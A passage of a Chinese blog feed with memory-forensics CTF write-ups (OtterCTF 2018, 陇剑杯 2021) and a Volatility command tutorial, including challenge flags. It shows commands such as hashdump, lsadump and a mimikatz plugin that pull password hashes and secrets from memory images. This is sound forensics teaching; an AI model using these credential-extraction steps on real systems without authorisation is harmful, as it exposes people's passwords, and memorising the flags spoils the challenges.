Morty.exe，这是非常不对劲的，可以怀疑这个vmware-tray.exe进程实际上是恶意软件释放出来的子进程,通过<code>cmdline</code>模块，可以追踪到程序的调用指令</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20230720202339089.png" alt="image-20230720202339089"></p><p>3)我们也可以百度一下</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20230720202413110.png" alt="image-20230720202413110"></p><pre class="line-numbers language-cobol" data-language="cobol"><code class="language-cobol">flag&#123;vmware-tray<span class="token punctuation">.</span>exe&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h1 id="七-OtterCTF-2018-Name-Game-2"><a href="#七-OtterCTF-2018-Name-Game-2" class="headerlink" title="七.[OtterCTF 2018]Name Game 2"></a>七.[OtterCTF 2018]Name Game 2</h1><pre class="line-numbers language-cobol" data-language="cobol"><code class="language-cobol"><span class="token keyword">From</span> a little research we found that the username <span class="token keyword">of</span> the logged <span class="token keyword">on</span> <span class="token keyword">character</span> <span class="token keyword">is</span> always <span class="token keyword">after</span> this signature<span class="token punctuation">:</span> 0x64 0x??&#123;6-8&#125; 0x40 0x06 0x??&#123;<span class="token number">18</span>&#125; 0x5a 0x0c 0x00&#123;<span class="token number">2</span>&#125;What<span class="token string">'s rick'</span>s <span class="token keyword">character</span>'s name?<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>考点:16进制, 在linux下，xxd指令可以打印文件的hexdump信息，故借此筛选特定信息的位置</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20230720202712351.png" alt="image-20230720202712351"></p><p>1)前面我们已经导出了游戏的进程，这里我们直接查看</p><p>xxd是一个十六进制转储工具，它可以将文件或标准输入的内容转换为十六进制格式进行显示</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20230720202755214.png" alt="image-20230720202755214"></p><p>2)我们使用命令: xxd &#x2F;home&#x2F;kali&#x2F;桌面&#x2F;708.dmp | grep “5a0c 0000”,这条命令的目的是从文件708.dmp中查找包含十六进制序列5a0c 0000的行，并将它们输出到终端。</p><p>5a0c 0000 是题目内容</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20230720203312064.png" alt="image-20230720203312064"></p><pre class="line-numbers language-cobol" data-language="cobol"><code class="language-cobol">flag&#123;M0rtyL0L&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h1 id="八-OtterCTF-2018-Path-To-Glory"><a href="#八-OtterCTF-2018-Path-To-Glory" class="headerlink" title="八.[OtterCTF 2018]Path To Glory"></a>八.[OtterCTF 2018]Path To Glory</h1><pre class="line-numbers language-cobol" data-language="cobol"><code class="language-cobol">How did the malware got <span class="token keyword">to</span> rick's PC? It must be one <span class="token keyword">of</span> rick old illegal habits<span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>恶意软件是如何到达Rick的PC的？它一定是里克旧的非法习惯之一<span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>    <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>考点:进程分析  提权进程</p><p>1)在前面我们知道恶意软件是:vmware-tray.exe，这里我们使用他的父进程3820</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20230721191335979.png" alt="image-20230721191335979"></p><p>2)我们可以看到3820就是恶意软件，我们搜索相关的内容——filescan | “grep Rick And Morty”</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20230721191710984.png" alt="image-20230721191710984"></p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20230721192154141.png" alt="image-20230721192154141"></p><p>3)我们提权相关的内容——dumpfiles  -Q   0x000000007dae9350 -D .&#x2F;</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20230721192407656.png" alt="image-20230721192407656"></p><p>4)我们使用strings进行查看</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20230721192523788.png" alt="image-20230721192523788"></p><pre class="line-numbers language-cobol" data-language="cobol"><code class="language-cobol">这里记得把最后的字母e去掉flag&#123;M3an_T0rren7_4_R!ck&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h1 id="九-OtterCTF-2018-Path-To-Glory-2"><a href="#九-OtterCTF-2018-Path-To-Glory-2" class="headerlink" title="九.[OtterCTF 2018]Path To Glory 2"></a>九.[OtterCTF 2018]Path To Glory 2</h1><pre class="line-numbers language-cobol" data-language="cobol"><code class="language-cobol"><span class="token keyword">Continue</span> the <span class="token keyword">search</span> <span class="token keyword">after</span> the way that malware got <span class="token keyword">in</span><span class="token punctuation">.</span>在恶意软件进入的方式之后继续进行搜索。<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>考点:历史记录 history 数据库</p><p>1)我们首先查看是什么浏览器</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20230721193231763.png" alt="image-20230721193231763"></p><p>2)谷歌浏览器，我们使用memdump -n 提取chrome信息    Memdump -n chrome.exe  -D .&#x2F;</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20230721193723492.png" alt="image-20230721193723492"></p><p>3)在chrome查看所有包含’Rick And Morty’ 的前后10行</p><pre class="line-numbers language-cobol" data-language="cobol"><code class="language-cobol">strings <span class="token operator">*</span><span class="token punctuation">.</span>dmp | grep -i <span class="token string">'Rick And Morty'</span> -C <span class="token number">10</span> 这个方法比较慢，而且还不好找<span class="token punctuation">,</span>我们可以查看这篇文章https<span class="token punctuation">:</span><span class="token operator">/</span><span class="token operator">/</span>www<span class="token punctuation">.</span>petermstewart<span class="token punctuation">.</span>net<span class="token operator">/</span>otterctf-2018-memory-forensics-write-up<span class="token operator">/</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><img src="/./../imgs/$%7Bfiilename%7D/image-20230721194621802.png" alt="image-20230721194621802"></p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20230721194550106.png" alt="image-20230721194550106"></p><pre class="line-numbers language-cobol" data-language="cobol"><code class="language-cobol">flag&#123;Hum@n_I5_Th3_Weak3s7_Link_In_Th3_Ch@<span class="token keyword">in</span>&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h1 id="十-OtterCTF-2018-Bit-4-Bit"><a href="#十-OtterCTF-2018-Bit-4-Bit" class="headerlink" title="十.[OtterCTF 2018]Bit 4 Bit"></a>十.[OtterCTF 2018]Bit 4 Bit</h1><pre class="line-numbers language-cobol" data-language="cobol"><code class="language-cobol">We<span class="token string">'ve found out that the malware is a ransomware. Find the attacker'</span>s bitcoin <span class="token keyword">address</span><span class="token punctuation">.</span>我们发现恶意软件是勒索软件。找到攻击者的比特币地址。<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>考点:搜索桌面文件，恶意进程</p><p>1)一般情况下，我们要是不知道在哪里查找文件，那么我们首先在桌面进行搜索</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20230721195219214.png" alt="image-20230721195219214"></p><p>2)我们可以看到2个txt文件，我们提取第一个txt文件     dumpfiles -Q 0x000000007d660500 -D .&#x2F;</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20230721195403564.png" alt="image-20230721195403564"></p><p>3)我们进行查看文件内容</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20230721195637756.png" alt="image-20230721195637756"></p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20230721195705687.png" alt="image-20230721195705687"></p><p>4)提示我们查看程序获得更多信息（就是上面的vmware-tray.exe）,我们提取恶意进程 Memdump -p 3720 -D .&#x2F;</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20230721195940051.png" alt="image-20230721195940051"></p><p>5)我们使用strings进行搜索ransomware题目的提示</p><pre class="line-numbers language-cobol" data-language="cobol"><code class="language-cobol">strings -e l <span class="token number">3720</span><span class="token punctuation">.</span>dmp | grep -i -A <span class="token number">5</span> <span class="token string">"ransomware"</span>该命令的目的是从名为 <span class="token string">"3720.dmp"</span> 的内存镜像文件中提取包含 <span class="token string">"ransomware"</span> 的字符串，并显示匹配行及其后的 <span class="token number">5</span> 行内容。这有助于在内存镜像中查找与勒索软件（ransomware）相关的信息<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><img src="/./../imgs/$%7Bfiilename%7D/image-20230721200235003.png" alt="image-20230721200235003"></p><pre class="line-numbers language-cobol" data-language="cobol"><code class="language-cobol">flag&#123;1MmpEmebJkqXG8nQv4cjJSmxZQFVmFo63M&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h1 id="十一-OtterCTF-2018-Graphic’s-For-The-Weak"><a href="#十一-OtterCTF-2018-Graphic’s-For-The-Weak" class="headerlink" title="十一.[OtterCTF 2018]Graphic’s For The Weak"></a>十一.[OtterCTF 2018]Graphic’s For The Weak</h1><pre class="line-numbers language-cobol" data-language="cobol"><code class="language-cobol">There<span class="token string">'s something fishy in the malware'</span>s graphics<span class="token punctuation">.</span>恶意软件的图形中有一些可疑的东西。<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>考点:procdump转存进程的可执行文件</p><p>1)前面我们知道恶意进程是3720，这里我们直接转存进程</p><p>procdump -p 3720 -D .&#x2F;</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20230721200617781.png" alt="image-20230721200617781"></p><p>2)我们使用binwalk进行分离软件,但是没有如何可用的信息，我们使用foremost</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20230721200932160.png" alt="image-20230721200932160"></p><p>3)可以看到一个文件夹，里面有图片</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20230721200807449.png" alt="image-20230721200807449"></p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20230721200832448.png" alt="image-20230721200832448"></p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20230721201144066.png" alt="image-20230721201144066"></p><pre class="line-numbers language-cobol" data-language="cobol"><code class="language-cobol">flag&#123;S0_Just_M0v3_Socy&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h1 id="十二-OtterCTF-2018-Recovery"><a href="#十二-OtterCTF-2018-Recovery" class="headerlink" title="十二.[OtterCTF 2018]Recovery"></a>十二.[OtterCTF 2018]Recovery</h1><pre class="line-numbers language-cobol" data-language="cobol"><code class="language-cobol">Rick got <span class="token keyword">to</span> have his files recovered! What <span class="token keyword">is</span> the <span class="token keyword">random</span> <span class="token keyword">password</span> used <span class="token keyword">to</span> encrypt the files?里克必须恢复他的文件！用于加密文件的随机密码是什么？<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>考点: 重定向文本</p><p>1)我们把上一题提取的 exe 文件放进 ida,找到一个 sendpassword 函数，用到了 computername 和 username</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20230721201804590.png" alt="image-20230721201804590"></p><p>2)strings -e l 3720.dmp &gt; 3720.dmp.strings,该命令是将名为 “3720.dmp” 的内存镜像文件中提取的可打印字符串保存到名为 “3720.dmp.strings” 的文本文件中</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20230721201918438.png" alt="image-20230721201918438"></p><p>3)grep “WIN-LO6FAF3DTFE”  3720.dmp.strings | sort | uniq</p><pre class="line-numbers language-cobol" data-language="cobol"><code class="language-cobol">该命令用于在名为 <span class="token string">"3720.dmp.strings"</span> 的文本文件中搜索包含 <span class="token string">"WIN-LO6FAF3DTFE"</span> 的行，并对结果进行排序和去重。<span class="token keyword">sort</span><span class="token punctuation">:</span> 这是一个命令行工具，用于对文本进行排序操作。uniq<span class="token punctuation">:</span> 这是一个命令行工具，用于从已排序的文本中去除重复行<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="/./../imgs/$%7Bfiilename%7D/image-20230721202228776.png" alt="image-20230721202228776"></p><pre class="line-numbers language-cobol" data-language="cobol"><code class="language-cobol">flag&#123;aDOBofVYUNVnmp7&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h1 id="十三-OtterCTF-2018-Closure"><a href="#十三-OtterCTF-2018-Closure" class="headerlink" title="十三.[OtterCTF 2018]Closure"></a>十三.[OtterCTF 2018]Closure</h1><pre class="line-numbers language-cobol" data-language="cobol"><code class="language-cobol">Now that you extracted the <span class="token keyword">password</span> <span class="token keyword">from</span> the <span class="token keyword">memory</span><span class="token punctuation">,</span> could you decrypt rick's files?现在您从内存中提取了密码，您可以解密Rick的文件吗？<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>考点: 密程序HiddenTearDecrypter</p><p>1)解密文件,前面我们知道桌面有2个文件，其中一个就是flag.txt</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20230721202821259.png" alt="image-20230721202821259"></p><p>2)我们把flag转储下来</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20230721202926497.png" alt="image-20230721202926497"></p><p>3)已知这个勒索软件为HiddenTear，直接在网上找到解密程序HiddenTearDecrypter,先将加密文件的末尾多余的0去掉，再把后缀加上locked</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20230721202746816.png" alt="image-20230721202746816"></p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20230721202753343.png" alt="image-20230721202753343"></p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20230721202758918.png" alt="image-20230721202758918"></p><pre class="line-numbers language-cobol" data-language="cobol"><code class="language-cobol">flag&#123;CTF&#123;lm_Th@_B3S7_RicK_of_Th3m_4ll&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;一-General-Info&quot;&gt;&lt;a href=&quot;#一-General-Info&quot; class=&quot;headerlink&quot; title=&quot;一.General Info&quot;&gt;&lt;/a&gt;一.General Info&lt;/h1&gt;&lt;pre class=&quot;line-numbers </summary>
      
    
    
    
    <category term="misc" scheme="http://ms02423.top/categories/misc/"/>
    
    
    <category term="内存取证" scheme="http://ms02423.top/tags/%E5%86%85%E5%AD%98%E5%8F%96%E8%AF%81/"/>
    
  </entry>
  
  <entry>
    <title>陇剑杯-2021-内存分析</title>
    <link href="http://ms02423.top/2023/07/18/%E9%99%87%E5%89%91%E6%9D%AF-2021-%E5%86%85%E5%AD%98%E5%88%86%E6%9E%90/"/>
    <id>http://ms02423.top/2023/07/18/%E9%99%87%E5%89%91%E6%9D%AF-2021-%E5%86%85%E5%AD%98%E5%88%86%E6%9E%90/</id>
    <published>2023-07-18T05:07:32.000Z</published>
    <updated>2023-07-18T12:29:22.025Z</updated>
    
    <content type="html"><![CDATA[<h1 id="一-简介"><a href="#一-简介" class="headerlink" title="一.简介"></a>一.简介</h1><p>Volatility是一款开源内存取证框架，能够对导出的内存镜像进行分析，通过获取内核数据结构，使用插件获取内存的详细情况以及系统的运行状态。</p><p>Volatility是一款非常强大的内存取证工具,它是由来自全世界的数百位知名安全专家合作开发的一套工具, 可以用于windows,linux,mac osx,android等系统内存取证。Volatility是一款开源内存取证框架，能够对导出的内存镜像进行分析，通过获取内核数据结构，使用插件获取内存的详细情况以及系统的运行状态。</p><h1 id="二-安装Volatility"><a href="#二-安装Volatility" class="headerlink" title="二.安装Volatility"></a>二.安装Volatility</h1><p>在不同系统下都有不同的软件版本</p><p>官网地址:<a href="https://www.volatilityfoundation.org/26">https://www.volatilityfoundation.org/26</a></p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20230718154641730.png" alt="image-20230718154641730"></p><p>根据自己需求下载</p><p> 另外不同的版本下，也存在着一定命令上的差异，使用时一定需注意</p><h2 id="1-windows"><a href="#1-windows" class="headerlink" title="1.windows"></a>1.windows</h2><p>直接下载解压就好了</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20230718155239224.png" alt="image-20230718155239224"></p><p>打开cmd 直接输入命令即可 ，cmd必须是当前目录，除非你设了环境变量</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20230718155533144.png" alt="image-20230718155533144"></p><h2 id="2-Linux下（这里kali为例）"><a href="#2-Linux下（这里kali为例）" class="headerlink" title="2. Linux下（这里kali为例）"></a>2. Linux下（这里kali为例）</h2><p>Volatility2.6需要python2，pip安装模块也需要2版本，具体命令根据实际情况调整</p><p>源码包（这是github,比较快，也可以下上面官网的，步骤是一样的)</p><p>下载解压</p><p>unzip volatility-master.zip</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20230718155805873.png" alt="image-20230718155805873"></p><p>安装依赖环境（distorm3 crypto）</p><p>crypto</p><p> pip2 install pycryptodome</p><p>如果安装失败，可使用以下命令切换国内源</p><p>pip2 install pycryptodome -i <a href="https://pypi.tuna.tsinghua.edu.cn/simple">https://pypi.tuna.tsinghua.edu.cn/simple</a></p><p>distorm3下载地址</p><p><a href="https://github.com/vext01/distorm3">https://github.com/vext01/distorm3</a></p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20230718155941796.png" alt="image-20230718155941796"></p><p>进行编译</p><p> python2 setup.py install</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20230718160013231.png" alt="image-20230718160013231"></p><p>安装Volatility</p><p>在解压后的Volatility目录下进行编译</p><p> python2 setup.py install</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20230718160048427.png" alt="image-20230718160048427"></p><p>检验</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20230718160108793.png" alt="image-20230718160108793"></p><h1 id="三-安装插件"><a href="#三-安装插件" class="headerlink" title="三 .安装插件"></a>三 .安装插件</h1><p>安装mimikatz</p><p>将mimikatz.py复制到volatility-master&#x2F;volatility&#x2F;plugins&#x2F;目录下，使用时需要添加参数–plugins&#x3D;.&#x2F;volatility-master&#x2F;volatility&#x2F;plugins。<br>运行时可能会出现如下错误，这是因为没有安装construct 模块：</p><p><strong>Volatility Foundation Volatility Framework 2.6</strong><br>*** Failed to import volatility.plugins.mimikatz (ImportError: No module named construct)<br>ERROR   : volatility.debug    : You must specify something to do (try -h)**<br>安装construct模块<br> pip install construct</p><h1 id="四-命令格式"><a href="#四-命令格式" class="headerlink" title="四.命令格式"></a>四.命令格式</h1><p>volatility -f [image] –profile&#x3D;[profile] [plugin] </p><p>volatility -f [对象] –profile&#x3D;[操作系统] [插件参数]</p><p>在分析之前，需要先判断当前的镜像信息，分析出是哪个操作系统 命令imageinfo即可获取镜像信息。</p><p>Volatility -f xxx.vmem imageinfo</p><p>在查到操作系统后如果不确定可以使用以下命令查看</p><p>volatility - f xxx.vmem –profile&#x3D;[操作系统] volshell<br>举个例子 像这种什么都找不到</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20230718160814458.png" alt="image-20230718160814458"></p><p><strong>当我们确定操作系统就可以利用插件去做题了</strong></p><h1 id="六-常用命令插件"><a href="#六-常用命令插件" class="headerlink" title="六.常用命令插件"></a>六.常用命令插件</h1><p>可以先查看当前内存镜像中的用户printkey -K  SAM\Domains\Account\Users\Names</p><pre class="line-numbers language-none"><code class="language-none">volatility -f 1.vmem –profile&#x3D;Win7SP1x64 printkey -K “SAM\Domains\Account\Users\Names”<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>查看用户名密码信息(密码是哈希值，需要john爆破) hashdump</p><pre><code>volatility -f 1.vmem --profile=Win7SP1x64 hashdump</code></pre><p>查看当前操作系统中的 password hash，例如 Windows 的 SAM 文件内容(mimikatz插件可以获取系统明文密码)<br>如果john爆破不出来，就使用 lasdmp 查看强密码 lsadump</p><pre><code>volatility -f 1.vmem --profile=Win7SP1x64 lsadump</code></pre><p>查看进程 pslist</p><pre><code>volatility -f 1.vmem --profile=Win7SP1x64 pslist</code></pre><p>pslist：该插件列举出系统进程，但它不能检测到隐藏或者解链的进程，psscan可以<br>查看已知进程pslist</p><pre><code>volatility -f 1.vmem --profile=Win7SP1x64 pslist -p 2588</code></pre><p>隐藏或解链的进程 psscan</p><pre><code>volatility -f 1.vmem --profile=Win7SP1x64 psscan</code></pre><p>psscan：可以找到先前已终止(不活动)的进程以及被rootkit隐藏或解链的进程<br>查看服务 查询服务名称 svcscan</p><pre><code>volatility -f 1.vmem --profile=Win7SP1x64 svcscan</code></pre><p>svcscan：扫描 Windows 的服务<br>查看浏览器历史记录,获取当前系统浏览器搜索过的关键词 iehistory</p><pre><code>volatility -f 1.vmem --profile=Win7SP1x64 iehistory</code></pre><p>查看网络连接 获取当前系统 ip netscan</p><pre><code>volatility -f 1.vmem --profile=Win7SP1x64 netscan</code></pre><p>有一些版本 这个命令是使用不了 这里我们就要使用（connscan,connections)<br>查看网络连接 connscan</p><pre><code>volatility -f 1.vmem --profile=Win7SP1x64 connscan</code></pre><p>connscan：查看网络连接<br>查看网络连接 connections</p><pre><code>volatility -f 1.vmem --profile=Win7SP1x64 connections</code></pre><p>connections：查看网络连接<br>查看命令行操作，显示cmd历史命令 cmdscan</p><pre><code>volatility -f 1.vmem --profile=Win7SP1x64 cmdscan</code></pre><p>cmdscan：可用于查看终端记录<br>查看进程命令行参数（具体一些可疑进程的参数指令) cmdline</p><pre><code>volatility -f 1.vmem --profile=Win7SP1x64 cmdline</code></pre><p>扫描所有的文件列表 filescan</p><pre><code>volatility -f 1.vmem --profile=Win7SP1x64 filescan</code></pre><p>（linux配合 grep 命令进行相关字符定向扫描，如：grep flag、grep -E ‘png|jpg|gif|zip|rar|7z|pdf|txt|doc’）</p><p>例</p><pre><code>   volatility -f 1.vmem --profile=Win7SP1x64 filescan grep &quot;flag.txt&quot;</code></pre><p>cat system.txt | grep -i computername<br>查看文件内容 dumpfiles</p><pre><code>volatility -f 1.vmem --profile=Win7SP1x64 dumpfiles -Q 0xxxxxxxx -D ./</code></pre><p>需要指定偏移量 -Q 和输出目录 -D</p><p>dumpfiles：导出某一文件(指定虚拟地址)<br>查看当前展示的notepad内容  notepad</p><pre><code>volatility -f 1.vmem --profile=Win7SP1x64 notepad</code></pre><p>查看当前展示的 notepad 文本（–profile&#x3D;winxp啥的低版本可以，win7的不行，可以尝试使用editbox）<br>显示有关编辑控件（曾经编辑过的内容）的信息 editbox</p><pre><code>volatility -f 1.vmem --profile=Win7SP1x64 editbox</code></pre><p>editbox：显示有关编辑控件（曾经编辑过的内容）的信息 查看内存中记事本的内容<br>提取进程 memdump</p><pre><code>volatility -f 1.vmem --profile=Win7SP1x64 memdump -p xxx --dump-dir=./</code></pre><p>memdump：提取出指定进程，常用foremost 来分离里面的文件  </p><p>需要指定进程-p [pid] 和输出目录 -D </p><p>memdump -p 332 -D XX&#x2F;   </p><p>提取进程   -p 进程号 -D 当前输出路径（导出为332.dmp）</p><p>dump出来的进程文件，可以使用 foremost 来分离里面的文件，用 binwak -e 不推荐</p><p>strings -e l 2040.dmp | grep flag 查找flag</p><p>屏幕截图 screenshot</p><pre><code>volatility -f 1.vmem --profile=Win7SP1x64 screenshot --dump-dir=./</code></pre><p>screenshot：保存基于GDI窗口的伪截屏<br>查看注册表配置单元 hivelist</p><pre><code>volatility -f 1.vmem --profile=Win7SP1x64 hivelist</code></pre><p>hivelist: 列出所有的注册表项及其虚拟地址和物理地址<br>查看注册表键名 hivedump</p><pre><code>volatility -f 1.vmem --profile=Win7SP1x64 hivedump -o 0xfffff8a001032410</code></pre><p>查看运行程序相关的记录，比如最后一次更新时间，运行过的次数等 userassist</p><pre><code>volatility -f 1.vmem --profile=Win7SP1x64 userassist</code></pre><p>最大程序提取信息timeliner</p><pre><code>volatility -f 1.vmem --profile=Win7SP1x64 timeliner</code></pre><p>timeliner: 将所有操作系统事件以时间线的方式展开<br>查看剪贴板信息 clipboard</p><pre><code>volatility -f 1.vmem --profile=Win7SP1x64 clipboard</code></pre><p>clipboard：查看剪贴板信息<br>恢复被删除的文件 mftparser</p><pre><code>volatility -f 1.vmem --profile=Win7SP1x64 mftparser</code></pre><p>mftparser：恢复被删除的文件<br>查看环境变量 envars</p><pre><code>volatility -f 1.vmem --profile=Win7SP1x64 envars</code></pre><p>envars：查看环境变量<br>列出某一进程加载的所有dll文件 dlllist</p><pre><code>volatility -f 1.vmem --profile=Win7SP1x64 dlllist -p 2588</code></pre><p>dlllist: 列出某一进程加载的所有dll文件<br>程序版本信息 verinfo</p><pre><code>volatility -f 1.vmem --profile=Win7SP1x64 verinfo</code></pre><p>列出PE｜程序版本信息<br>产看进程树，可以轻松了解各进程之间的关系：父进程与子进程 pstree</p><pre><code>volatility -f 2008.raw –profile=Win2008R2SP1x64 pstree</code></pre><p>在进程中PPID比PID还大，那就可能这个进程有异常程序<br>从内存文件中找到异常程序植入到系统的开机自启痕迹 shimcache</p><pre><code>volatility -f 2008.raw –profile=Win2008R2SP1x64 shimcache</code></pre><h1 id="七-例题讲解"><a href="#七-例题讲解" class="headerlink" title="七.例题讲解"></a>七.例题讲解</h1><p>[陇剑杯 2021]内存分析</p><p>1.网管小王制作了一个虚拟机文件，让您来分析后作答：虚拟机的密码是_____________。（密码中为flag{xxxx}，含有空格，提交时不要去掉）。</p><p>1)首先确定镜像是何种操作系统的，命令imageinfo即可获取镜像信息</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20230718192418198.png" alt="image-20230718192418198"></p><p>2)我们使用hashdump获取sam</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20230718192741658.png" alt="image-20230718192741658"></p><p>3)john工具来进行爆破，但是好像跑不出来结果。应该是设定了强密码。于是只能使用了lasdump命令来查看</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20230718192801504.png" alt="image-20230718192801504"></p><p>我们可以看到flag</p><pre class="line-numbers language-cobol" data-language="cobol"><code class="language-cobol">flag&#123;W31C0M3 T0 THiS 34SY F0R3NSiCX&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>2.虚拟机中有一个某品牌手机的备份文件，文件里的图片里的字符串为_____________。（解题过程中需要用到上一题答案中flag{}内的内容进行处理。本题的格式也是flag{xxx}，含有空格，提交时不要去掉）</p><p>1)我们直接在桌面进行搜索，我们可以看到HUAWEI手机</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20230718193125512.png" alt="image-20230718193125512"></p><p>2)我们直接搜索HUAWEI</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20230718193510157.png" alt="image-20230718193510157"></p><p>3)将第一个提取出来</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20230718193728215.png" alt="image-20230718193728215"></p><p>4)我们可以看到2个文件，我们进行解压</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20230718193757715.png" alt="image-20230718193757715"></p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20230718194316509.png" alt="image-20230718194316509"></p><p>5)解压完成后发现多了一个HUAWEI P40_2021-aa-bb xx.yy.zz文件夹，并且在里面发现一个images0.tar.enc文件，此文件为华为加密文件，我们需要在网上下载解密脚本，解压密码题目中已经提示为上一题的flag,也就是W31C0M3 T0 THiS 34SY F0R3NSiCX，注意，运行脚本时密码的空格要改为’_’也就是W31C0M3_T0_THiS_34SY_F0R3NSiCX</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20230718194455738.png" alt="image-20230718194455738"></p><p>6)项目地址</p><pre class="line-numbers language-cobol" data-language="cobol"><code class="language-cobol">https<span class="token punctuation">:</span><span class="token operator">/</span><span class="token operator">/</span>github<span class="token punctuation">.</span>com<span class="token operator">/</span>RealityNet<span class="token operator">/</span>kobackupdec<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>然后运行命令</p><pre class="line-numbers language-php" data-language="php"><code class="language-php">用法：kobackupdec<span class="token operator">.</span>py <span class="token punctuation">[</span><span class="token operator">-</span>h<span class="token punctuation">]</span> <span class="token punctuation">[</span><span class="token operator">-</span>v<span class="token punctuation">]</span> password backup_path dest_pathpassword：是用户提供的密码backup_path：是包含华为备份的文件夹，可以使用相对或绝对路径dest_path：是要在指定路径（绝对或相对）中创建的文件夹。如果提供的文件夹已存在，它将报错例如：python kobackupdec<span class="token operator">.</span>py <span class="token operator">-</span>vvv W31C0M3_T0_THiS_34SY_F0R3NSiCX <span class="token string double-quoted-string">"/home/kali/volatility_2.6_lin64_standalone/HUAWEI P40_2021-aa-bb xx.yy.zz/picture/storage/MediaTar/images/"</span> <span class="token operator">/</span>home<span class="token operator">/</span>kali<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>由于我的环境有问题，所以后面我使用网上的图片</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20230718201203971.png" alt="image-20230718201203971"></p><p>7)运行完后会有两个文件，打开storage</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20230718201230377.png" alt="image-20230718201230377"></p><p>8)里面会有一个.tar压缩文件，打开后会有flag</p><p><img src="/./../imgs/$%7Bfiilename%7D/2a86bea6dbfd4e91a3559abcc1b9b39a.png" alt="img"></p><pre class="line-numbers language-cobol" data-language="cobol"><code class="language-cobol">flag&#123;TH4NK Y0U <span class="token keyword">FOR</span> DECRYPTING MY <span class="token keyword">DATA</span>&#125; <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;一-简介&quot;&gt;&lt;a href=&quot;#一-简介&quot; class=&quot;headerlink&quot; title=&quot;一.简介&quot;&gt;&lt;/a&gt;一.简介&lt;/h1&gt;&lt;p&gt;Volatility是一款开源内存取证框架，能够对导出的内存镜像进行分析，通过获取内核数据结构，使用插件获取内存的详细情况以</summary>
      
    
    
    
    <category term="misc" scheme="http://ms02423.top/categories/misc/"/>
    
    
    <category term="内存取证" scheme="http://ms02423.top/tags/%E5%86%85%E5%AD%98%E5%8F%96%E8%AF%81/"/>
    
  </entry>
  
  <entry>
    <title>红日靶场(一)</title>
